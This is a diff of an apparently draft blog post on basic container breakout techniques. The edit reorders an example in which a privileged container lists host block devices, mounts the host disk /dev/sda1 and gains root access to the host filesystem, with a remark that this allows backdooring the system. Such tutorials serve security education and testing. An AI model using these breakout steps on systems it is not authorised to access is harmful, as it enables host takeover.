@@ -4,9 +4,6 @@ date: 2020-07-11T13:09:54+02:00
 draft: true
 ---
 
-
-Basic Container Breakouts
-
 If you are bored of searching for the most-known container breakout techniques, here is a collection. This post addresses abuse of [shared root filesystem](#shared-host-root-directory) (2 ways), [privileged container](#privileged-container) (3 ways) and access to the [Docker Socket](#docker-socket) (1 way). Okay, to be fair – some techniques refer to each other.
 
 ## Intro
@@ -107,8 +104,9 @@ crw-r--r-- 1 root root  10, 235 Jul 11 09:20 autofs
 brw-rw---- 1 root  994   8,   0 Jul 11 09:20 sda
 brw-rw---- 1 root  994   8,   1 Jul 11 09:20 sda1
 [...]
-# mount /dev/sda1 /mnt/
-user@732c0d1ca2db:~$ ls -l /mnt/
+# mkdir /hostfs
+# mount /dev/sda1 /hostfs
+# ls -l /hostfs/
 total 132
 lrwxrwxrwx   1 root root     7 Nov 19  2019 bin -> usr/bin
 drwxr-xr-x   4 root root  4096 May 13 13:29 boot
@@ -122,9 +120,8 @@ lrwxrwxrwx   1 root root     7 Nov 19  2019 sbin -> usr/bin
 […]
 drwxr-xr-x  10 root root  4096 May 26 14:37 usr
 […]
-# mkdir /hostfs
-# mount /dev/sda1 /hostfs
 ```
+
 As you can see, the **hard drive** itself is listed, which can be **mounted**. After mounting the device, it is possible to interact as root user with the device and backdoor the system.
 
 Getting access via the hard drive is already described in the previous section [Shared Host root-directory](#shared-host-root-directory).
